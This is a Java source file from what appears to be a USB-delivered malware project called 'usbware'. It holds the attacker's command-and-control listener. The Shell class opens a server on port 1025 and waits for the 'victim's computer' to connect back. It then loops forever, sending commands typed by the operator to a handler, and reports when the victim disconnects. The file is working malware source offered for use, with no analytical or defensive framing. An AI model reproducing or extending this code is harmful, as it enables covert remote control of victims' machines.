package thatcherdev.usbware.usbware;

import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Shell {

	private static ServerSocket serverSocket;
	private static Socket socket;
	public static Scanner in;
	public static PrintWriter out;

	/**
	 * Creates server on port 1025 for victim's computer to connect to. Once
	 * connected initializes {@link socket}, {@link in}, and {@link out} and starts
	 * an infinite loop that gets command {@link command} from user and handles it
	 * with {@link HandleCommand.handle(command)}.
	 */
	public static void start() {
		System.out.println("Connecting...\n");
		try {
			serverSocket=new ServerSocket(1025);
			socket=serverSocket.accept();
			in=new Scanner(socket.getInputStream());
			out=new PrintWriter(socket.getOutputStream(), true);
			System.out.println("Connection has been established");
			System.out.println("Enter 'help' for a list of available commands");
			while(true) {
				String command=USBware.getInput("");
				HandleCommand.handle(command);
			}
		}catch (Exception e) {
			if(e.getMessage().equals("String index out of range: -1"))
				USBware.error("The victim's computer has disconnected");
			else
				USBware.error(e.getMessage());
		}finally {
			try {
				if(socket!=null)
					socket.close();
				if(in!=null)
					in.close();
				if(out!=null)
					out.close();
			}catch (Exception e) {}
		}
	}
}